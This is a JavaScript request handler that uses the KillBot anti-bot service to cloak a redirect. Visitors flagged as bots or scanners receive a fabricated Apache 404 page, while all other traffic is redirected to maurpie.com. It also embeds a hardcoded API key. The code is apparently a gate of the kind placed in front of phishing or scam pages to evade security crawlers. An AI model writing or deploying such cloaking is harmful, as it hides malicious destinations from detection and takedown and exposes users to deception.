import KillBot from 'killbot.to';

const apiKey = '225e7b97-524c-45d6-800c-aa7e3831a1ab';
const config = 'default';
const killBot = new KillBot(apiKey, config);

function isLocalIp(ip) {
  // Filtre basique pour ignorer IPs locales ou vides
  // Ajustez selon vos besoins (ex: 172.16.x, 169.254.x, fe80::, etc.)
  return (
    !ip ||
    ip.startsWith('127.') ||
    ip.startsWith('10.') ||
    ip.startsWith('192.168.') ||
    ip.startsWith('::1') ||
    ip === '0.0.0.0'
  );
}

export default async function handler(req, res) {
  try {
    // Récupération "classique" de l'IP + user-agent
    let ip =
      req.headers['x-forwarded-for']?.split(',')[0].trim() ||
      req.socket?.remoteAddress ||
      '0.0.0.0';

    const userAgent = req.headers['user-agent'] || 'Unknown-UA';

    // Regarde si c'est local/invalid => on ignore KillBot
    if (isLocalIp(ip)) {
      console.log('KillBot: IP locale ou invalide => on ignore, et on redirige.');
      res.writeHead(302, { Location: 'https://maurpie.com' });
      return res.end();
    }

    // Si c'est une IP “publique” (ou du moins pas local selon notre test)
    // on tente KillBot
    let result;
    try {
      result = await killBot.check({ ip, ua: userAgent });
    } catch (err) {
      // Si KillBot renvoie "Invalid IP address provided" ou autre
      console.log('KillBot error => on ignore et on redirige:', err.message);
      res.writeHead(302, { Location: 'https://maurpie.com' });
      return res.end();
    }

    // Si KillBot n'a pas crashé...
    if (result.block) {
      const fake404 = `
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head><title>404 Not Found</title></head>
<body>
  <h1>Not Found</h1>
  <p>The requested URL was not found on this server.</p>
  <hr>
  <address>Apache/2.4.57 (Debian) Server Port 80</address>
</body></html>`;
      return res.status(404).send(fake404);
    } else {
      res.writeHead(302, { Location: 'https://maurpie.com' });
      return res.end();
    }
  } catch (err) {
    console.error('KillBot general error:', err);
    return res.status(500).send('Internal Server Error');
  }
}